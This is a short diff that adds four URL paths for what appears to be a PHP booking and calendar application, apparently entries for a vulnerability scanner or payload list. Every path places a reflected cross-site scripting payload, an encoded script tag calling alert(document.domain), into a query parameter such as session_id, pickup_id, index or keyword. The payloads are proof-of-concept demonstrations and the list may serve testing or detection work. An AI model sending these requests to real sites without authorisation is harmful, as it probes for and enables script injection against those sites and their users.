@@ -1,0 +1,4 @@
+/index.php?controller=pjFront&action=pjActionGetBookingForm&session_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cid=1&view=1&month=7&year=2023&start_dt=&end_dt=&locale=&index=0
+/index.php?controller=pjFrontEnd&action=pjActionGetLocations&locale=1&hide=0&index=4005&pickup_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cid=1&view=1&month=7&year=2023&start_dt=&end_dt=&locale=&index=0&session_id=
+/index.php?controller=pjFront&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/preview.php?controller=pjLoad&action=pjActionIndex&question_search=1&pjPage=1&column=created&direction=DESC&keyword=%22><script>alert(document.domain)</script>
